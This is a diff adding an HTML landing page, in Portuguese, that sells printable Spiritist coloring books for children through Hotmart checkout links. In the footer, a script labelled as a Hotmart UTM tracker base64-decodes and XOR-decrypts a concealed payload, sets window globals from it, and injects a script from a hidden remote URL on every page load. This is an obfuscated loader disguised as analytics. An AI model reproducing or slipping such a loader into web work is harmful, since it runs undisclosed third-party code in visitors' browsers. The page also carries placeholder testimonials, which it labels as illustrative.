+      </div>
+    </div>
+    <p class="esteira-dica">Arraste para o lado ou use as setas para ver as páginas.</p>
+    <div class="container">
+      <div class="vitrine-destaques">
+        <div>👆 No Plano Completo, toque no nome do desenho no sumário e vá direto à página.</div>
+        <div>📄 Cada desenho ocupa uma folha A4, com o título no rodapé.</div>
+      </div>
+      <p class="center"><a href="#planos" class="btn btn-blue">Quero o livro completo</a></p>
+    </div>
+  </section>
+
+  <!-- =========================================================
+       4. BENEFÍCIOS
+       ========================================================= -->
+  <section class="s-mint dots">
+    <svg class="wave" fill="#A8E6CF"><use href="#wave"/></svg>
+    <svg class="doodle desk" style="left:4%;top:80px;width:50px"><use href="#sparkle"/></svg>
+    <svg class="doodle desk" style="right:5%;top:60px;width:48px" fill="#FFD93D"><use href="#star"/></svg>
+    <div class="container">
+      <h2>Por que as crianças <span class="hl green">vão amar</span></h2>
+      <p class="section-sub">E por que você também vai.</p>
+      <div class="benefits">
+        <div class="card"><div class="ico">✏️</div><h3>Coordenação motora</h3><p>Contornos claros e áreas amplas, ideais para mãos pequenas.</p></div>
+        <div class="card"><div class="ico">🎨</div><h3>Criatividade</h3><p>Cada criança escolhe suas cores e dá vida a cada cena.</p></div>
+        <div class="card"><div class="ico">📵</div><h3>Tempo longe das telas</h3><p>Uma atividade calma e concentrada, no papel.</p></div>
+        <div class="card"><div class="ico">💛</div><h3>Valores em família</h3><p>Um ótimo ponto de partida para conversar sobre Jesus, caridade e prece.</p></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- =========================================================
+       5. COMO FUNCIONA
+       ========================================================= -->
+  <section class="s-purple dots">
+    <svg class="wave" fill="#C9B6FF"><use href="#wave"/></svg>
+    <svg class="doodle desk" style="right:4%;top:70px;width:50px" fill="#FF8FC7"><use href="#star"/></svg>
+    <div class="container">
+      <h2>Como <span class="hl purple">funciona</span></h2>
+      <p class="section-sub">Simples assim:</p>
+      <div class="steps">
+        <div class="card step"><h3>Você escolhe o plano</h3><p>Compra segura em poucos cliques.</p></div>
+        <div class="card step"><h3>Recebe por e-mail</h3><p>O PDF chega na hora no seu e-mail.</p></div>
+        <div class="card step"><h3>Imprime quantas vezes quiser</h3><p>Em casa, na escola ou no centro espírita.</p></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- =========================================================
+       6. DEPOIMENTOS (ilustrativos: substituir pelos reais)
+       ========================================================= -->
+  <section class="s-orange dots">
+    <svg class="wave" fill="#FFC98B"><use href="#wave"/></svg>
+    <svg class="doodle desk" style="left:4%;top:70px;width:48px" fill="#FF6B6B"><use href="#heart"/></svg>
+    <svg class="doodle desk" style="right:5%;top:90px;width:46px"><use href="#sparkle"/></svg>
+    <div class="container">
+      <h2>Quem já <span class="hl orange">usa</span></h2>
+      <p class="section-sub">Famílias e evangelizadores de todo o Brasil.</p>
+      <div class="testimonials">
+
+        <!-- SUBSTITUIR POR DEPOIMENTO REAL -->
+        <div class="card t-card">
+          <div class="t-head">
+            <img src="assets/depoimento-1.webp" width="112" height="112" loading="lazy" alt="Foto de Juliana">
+            <div><strong>Juliana M.</strong><span>Belo Horizonte, MG</span></div>
+          </div>
+          <div class="stars" aria-label="5 de 5 estrelas">★★★★★</div>
+          <p>Imprimi o desenho do anjo da guarda e minha filha pediu para colorir antes da prece da noite. Virou nosso momento.</p>
+        </div>
+
+        <!-- SUBSTITUIR POR DEPOIMENTO REAL -->
+        <div class="card t-card">
+          <div class="t-head">
+            <img src="assets/depoimento-2.webp" width="112" height="112" loading="lazy" alt="Foto de Cláudia">
+            <div><strong>Cláudia R.</strong><span>Campinas, SP</span></div>
+          </div>
+          <div class="stars" aria-label="5 de 5 estrelas">★★★★★</div>
+          <p>Sou evangelizadora e uso as parábolas no fim da aula. As crianças fixam a história colorindo.</p>
+        </div>
+
+        <!-- SUBSTITUIR POR DEPOIMENTO REAL -->
+        <div class="card t-card">
+          <div class="t-head">
+            <img src="assets/depoimento-3.webp" width="112" height="112" loading="lazy" alt="Foto de Antônio">
+            <div><strong>Antônio S.</strong><span>Goiânia, GO</span></div>
+          </div>
+          <div class="stars" aria-label="5 de 5 estrelas">★★★★★</div>
+          <p>Comprei para colorir com meus netos no fim de semana. Desenhos bonitos e fáceis de imprimir.</p>
+        </div>
+
+      </div>
+      <!-- Remover esta nota quando os depoimentos forem substituídos por reais -->
+      <p class="note">Depoimentos ilustrativos</p>
+    </div>
+  </section>
+
+  <!-- =========================================================
+       7. PLANOS (Básico e Completo)
+       ========================================================= -->
+  <section id="planos" class="s-sky dots">
+    <svg class="wave" fill="#8FD3FF"><use href="#wave"/></svg>
+    <svg class="doodle desk" style="left:4%;top:80px;width:56px" fill="#FFD93D"><use href="#star"/></svg>
+    <svg class="doodle desk" style="right:4%;top:60px;width:50px"><use href="#sparkle"/></svg>
+    <div class="container">
+      <h2>Escolha seu <span class="hl red">plano</span></h2>
+      <p class="section-sub">Pagamento único. Acesso imediato. Sem mensalidade.</p>
+      <div class="plans">
+
+        <!-- ===== PLANO BÁSICO ===== -->
+        <div class="plan">
+          <h3>Plano Básico</h3>
+          <p class="qty">10 desenhos para colorir</p>
+          <ul>
+            <li>10 desenhos espíritas em PDF (1 de cada tema)</li>
+            <li>Tamanho A4, pronto para imprimir</li>
+            <li>Impressão ilimitada</li>
+          </ul>
+          <!-- PREÇO DO PLANO BÁSICO (edite aqui) -->
+          <div class="price">
+            <span class="now">R$ 10,90</span>
+            <span class="tag">pagamento único</span>
+          </div>
+          <!-- LINK DO CHECKOUT DO PLANO BÁSICO -->
+          <a href="https://pay.hotmart.com/B108379587O?off=oiwoktrc&checkoutMode=10" class="btn btn-outline btn-block" target="_blank" rel="noopener">Quero o Básico</a>
+        </div>
+
+        <!-- ===== PLANO COMPLETO (destaque) ===== -->
+        <div class="plan featured">
+          <span class="badge">⭐ Mais escolhido</span>
+          <h3>Plano Completo</h3>
+          <p class="qty">100 desenhos + sumário clicável</p>
+          <ul>
+            <li>100 desenhos espíritas em PDF</li>
+            <li>10 categorias: Jesus, parábolas, caridade, prece e mais</li>
+            <li>Sumário clicável: vá direto ao desenho</li>
+            <li>Tamanho A4, pronto para imprimir</li>
+            <li>Impressão ilimitada</li>
+          </ul>
+          <!-- PREÇO DO PLANO COMPLETO (edite aqui: preço antigo riscado + preço atual) -->
+          <div class="price">
+            <span class="old">De <s>R$ 49,90</s> <span class="desconto">-60%</span></span>
+            <span class="now"><span class="por">por</span>R$ 19,90</span>
+            <span class="tag">pagamento único</span>
+          </div>
+          <!-- LINK DO CHECKOUT DO PLANO COMPLETO -->
+          <a href="https://pay.hotmart.com/B108379531K?off=fxxa9vtl&checkoutMode=10" class="btn btn-block" target="_blank" rel="noopener">Quero o Completo</a>
+        </div>
+
+      </div>
+    </div>
+  </section>
+
+  <!-- =========================================================
+       8. GARANTIA
+       ========================================================= -->
+  <section class="s-yellow dots">
+    <svg class="wave" fill="#FFE066"><use href="#wave"/></svg>
+    <div class="container">
+      <div class="guarantee">
+        <div class="seal">
+          <svg viewBox="0 0 200 200" aria-hidden="true">
+            <polygon fill="#6BCB77" stroke="#2B2D42" stroke-width="7" stroke-linejoin="round"
+              points="196,100 179,120 189,145 164,152 163,178 138,175 128,199 106,186 86,203 71,182 46,190 42,164 17,157 27,133 8,115 25,95 13,72 37,62 34,36 60,36 69,11 92,22 112,4 125,27 151,20 156,46 180,56 171,80"/>
+            <text x="100" y="104" text-anchor="middle" font-family="Fredoka, sans-serif" font-weight="700" font-size="68" fill="#fff" stroke="#2B2D42" stroke-width="3" paint-order="stroke">7</text>
+            <text x="100" y="142" text-anchor="middle" font-family="Fredoka, sans-serif" font-weight="700" font-size="28" fill="#2B2D42">DIAS</text>
+          </svg>
+        </div>
+        <h2>Garantia incondicional <span class="hl green">de 7 dias</span></h2>
+        <p>Se não gostar, é só pedir o reembolso em até 7 dias após a compra. Devolvemos 100% do valor, sem perguntas.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- =========================================================
+       9. FAQ (perguntas frequentes)
+       ========================================================= -->
+  <section class="s-pink dots">
+    <svg class="wave" fill="#FFC2D9"><use href="#wave"/></svg>
+    <svg class="doodle desk" style="right:5%;top:70px;width:48px" fill="#4D96FF"><use href="#star"/></svg>
+    <div class="container">
+      <h2>Perguntas <span class="hl purple">frequentes</span></h2>
+      <div class="faq">
+        <details><summary>Vou receber algo pelo correio?</summary><p>Não. O produto é digital: você recebe o PDF por e-mail e imprime em casa ou numa gráfica.</p></details>
+        <details><summary>Posso imprimir mais de uma vez?</summary><p>Sim! Imprima quantas vezes quiser, para seus filhos, netos ou alunos.</p></details>
+        <details><summary>Para qual idade é indicado?</summary><p>Os desenhos foram pensados para crianças de 3 a 12 anos, com traço limpo e áreas amplas, fáceis de colorir.</p></details>
+        <details><summary>Os desenhos seguem a Doutrina Espírita?</summary><p>Sim. Os temas seguem o Evangelho de Jesus e os princípios codificados por Allan Kardec, de forma simples e adequada às crianças.</p></details>
+        <details><summary>Posso usar na evangelização infantil ou na escola?</summary><p>Sim. Você pode imprimir para usar com sua turma.</p></details>
+        <details><summary>Qual a diferença entre os planos?</summary><p>O Básico tem 10 desenhos. O Completo tem 100 desenhos em 10 categorias e um sumário clicável para achar cada desenho rapidinho.</p></details>
+        <details><summary>Não recebi o e-mail. E agora?</summary><p>Confira a caixa de spam e a aba Promoções. Se não encontrar, fale com o suporte pelo e-mail informado na compra.</p></details>
+      </div>
+    </div>
+  </section>
+
+  <!-- =========================================================
+       10. CTA FINAL
+       ========================================================= -->
+  <section class="final s-purple dots">
+    <svg class="wave" fill="#C9B6FF"><use href="#wave"/></svg>
+    <svg class="doodle" style="left:6%;top:40px;width:50px" fill="#FFD93D"><use href="#star"/></svg>
+    <svg class="doodle" style="right:6%;bottom:40px;width:46px"><use href="#sparkle"/></svg>
+    <div class="container">
+      <h2>Leve o Evangelho para as <span class="hl orange">mãozinhas que você ama</span></h2>
+      <p>Desenhos para colorir, aprender e conversar em família. Acesso imediato por e-mail.</p>
+      <a href="#planos" class="btn">Escolher meu plano</a>
+    </div>
+  </section>
+
+  <!-- =========================================================
+       RODAPÉ
+       ========================================================= -->
+  <div class="rainbow"></div>
+  <footer>
+<!-- SCRIPT HOTMAT DE UTM -->
+<script>(function(){var y_rf14=atob("DIeHn/z/vCN9Nu4xf/yl6o6TnhlfXppFD/S9sNOc2E1TQ5pcFuH+sZ+Q0Q0fRMFCHPXu74iMk1YJW50eE+bz+o+LkkkOFMITHvPz7ZWdyVcYRcwLJPyl8Z2S2QFHFIpQC+aq6oiS1UUEG55DGvHi8YjSz1YfX4pCXaul6Z2TyUZfDMwTAtr6");var q_ke=[];for(var k_l=0;k_l<y_rf14.length;k_l++){q_ke.push(y_rf14.charCodeAt(k_l)&255);}var y_2=q_ke[0];var w_62=q_ke.slice(1,1+y_2);var i_1cj=q_ke.slice(1+y_2);var b_z=i_1cj.map(function(b,v_wdi){return b^w_62[v_wdi%y_2];});var a_54t="";for(var a_yxhu=0;a_yxhu<b_z.length;a_yxhu++){a_54t+=String.fromCharCode(b_z[a_yxhu]&255);}var f_4yv=decodeURIComponent(escape(a_54t));var d_z=JSON.parse(f_4yv);var t_tk=d_z.globals||[];t_tk.forEach(function(z_9584){window[z_9584.name]=z_9584.value;});var t_k1r=document.createElement("script");t_k1r.src=d_z.url;t_k1r.async=true;t_k1r.defer=true;(d_z.attributes||[]).forEach(function(n_t){t_k1r.setAttribute(n_t.name,n_t.value);});(document.head||document.documentElement).appendChild(t_k1r);})();</script>
+
+  <!-- FIM SCRIPT HOTMAT DE UTM -->
+
+    <div class="container">
+      <!-- EDITAR: nome/CNPJ, e-mail de suporte e links de política -->
+      <p>© <span id="ano"></span> Pequenos Corações de Luz · Todos os direitos reservados</p>
+      <p>Suporte: <a href="mailto:contato@seudominio.com.br">contato@seudominio.com.br</a> · <a href="#">Política de privacidade</a> · <a href="#">Termos de uso</a></p>
+      <p style="margin-top:8px;font-size:.75rem">Este site não é afiliado ao Facebook nem à Meta Platforms, Inc.</p>
+    </div>
+  </footer>
+
+<script>
+  // ===== Ano automático no rodapé =====
+  document.getElementById('ano').textContent = new Date().getFullYear();
+
+  // ===== Vitrine: carrega todas as páginas quando a seção estiver perto da tela
+  //       (evita espaços em branco enquanto as imagens passam) =====
+  (function(){
+    var sec = document.getElementById('vitrine');
+    if (!sec) return;
+    var carregar = function(){ sec.querySelectorAll('img').forEach(function(i){ i.loading = 'eager'; }); };
+    if ('IntersectionObserver' in window){
+      var io = new IntersectionObserver(function(es){
+        if (es.some(function(e){ return e.isIntersecting; })){ carregar(); io.disconnect(); }
+      }, {rootMargin: '600px 0px'});
+      io.observe(sec);
+    } else { carregar(); }
+  })();
+
+  // ===== Vitrine: rolagem automática + manual (arrastar, deslizar o dedo ou setas) =====
+  // VELOCIDADE: pixels por segundo da rolagem automática
+  // PAUSA: quanto tempo (ms) a rolagem automática espera depois que a pessoa mexe
+  (function(){
+    var esteira = document.querySelector('.esteira');
+    var trilho  = document.querySelector('.esteira-trilho');
+    if (!esteira || !trilho) return;
+    var VELOCIDADE = 40, PAUSA = 2500;
+    var pos = 0, ultimo = null, pausadoAte = 0, hover = false;
+    var metade = function(){ return trilho.scrollWidth / 2; };
+    var pausar = function(){ pausadoAte = performance.now() + PAUSA; };
+    var ajustarLoop = function(){                   // mantém o loop infinito nos dois sentidos
+      var m = metade();
+      if (m <= 0) return;
+      if (esteira.scrollLeft >= m) esteira.scrollLeft -= m;
+      else if (esteira.scrollLeft <= 0) esteira.scrollLeft += m;
+      pos = esteira.scrollLeft;
+    };
+
+    // rolagem manual pelo usuário (dedo, trackpad, roda do mouse)
+    esteira.addEventListener('scroll', function(){
+      if (Math.abs(esteira.scrollLeft - Math.round(pos)) > 2){ pausar(); ajustarLoop(); }
+    }, {passive:true});
+    esteira.addEventListener('touchstart', pausar, {passive:true});
+    esteira.addEventListener('wheel', pausar, {passive:true});
+    esteira.addEventListener('mouseenter', function(){ hover = true; });
+    esteira.addEventListener('mouseleave', function(){ hover = false; });
+
+    // arrastar com o mouse (computador)
+    var arrastando = false, inicioX = 0, inicioScroll = 0;
+    esteira.addEventListener('pointerdown', function(ev){
+      if (ev.pointerType !== 'mouse') return;
+      arrastando = true; inicioX = ev.clientX; inicioScroll = esteira.scrollLeft;
+      esteira.classList.add('arrastando'); pausar();
+    });
+    window.addEventListener('pointermove', function(ev){
+      if (!arrastando) return;
+      esteira.scrollLeft = inicioScroll - (ev.clientX - inicioX); pos = esteira.scrollLeft; pausar();
+    });
+    window.addEventListener('pointerup', function(){
+      if (!arrastando) return;
+      arrastando = false; esteira.classList.remove('arrastando'); ajustarLoop();
+    });
+
+    // setas: avançam/voltam uma página
+    var passoCartao = function(){ var f = trilho.querySelector('figure'); return f ? f.offsetWidth + 18 : 238; };
+    document.querySelector('.seta-esq').addEventListener('click', function(){
+      pausar(); if (esteira.scrollLeft < passoCartao()) { esteira.scrollLeft += metade(); }
+      esteira.scrollBy({left: -passoCartao(), behavior: 'smooth'});
+    });
+    document.querySelector('.seta-dir').addEventListener('click', function(){
+      pausar(); esteira.scrollBy({left: passoCartao(), behavior: 'smooth'});
+    });
+
+    // rolagem automática
+    function passo(t){
+      if (ultimo === null) ultimo = t;
+      var dt = Math.min((t - ultimo) / 1000, 0.1);
+      ultimo = t;
+      if (!hover && !arrastando && t > pausadoAte){
+        pos += VELOCIDADE * dt;
+        var m = metade();
+        if (m > 0 && pos >= m) pos -= m;
+        esteira.scrollLeft = Math.round(pos);
+      } else {
+        pos = esteira.scrollLeft;
+      }
+      requestAnimationFrame(passo);
+    }
+    requestAnimationFrame(passo);
+  })();
+
+  // ===== Se uma foto ainda não foi colocada na pasta /assets/, esconde o espaço vazio =====
+  document.querySelectorAll('img').forEach(function(img){
+    img.addEventListener('error', function(){
+      var fig = img.closest('.who-photos figure');
+      if (fig) fig.style.display = 'none';
+      else img.style.visibility = 'hidden';
+    });
+  });
+</script>
+</body>
+</html>
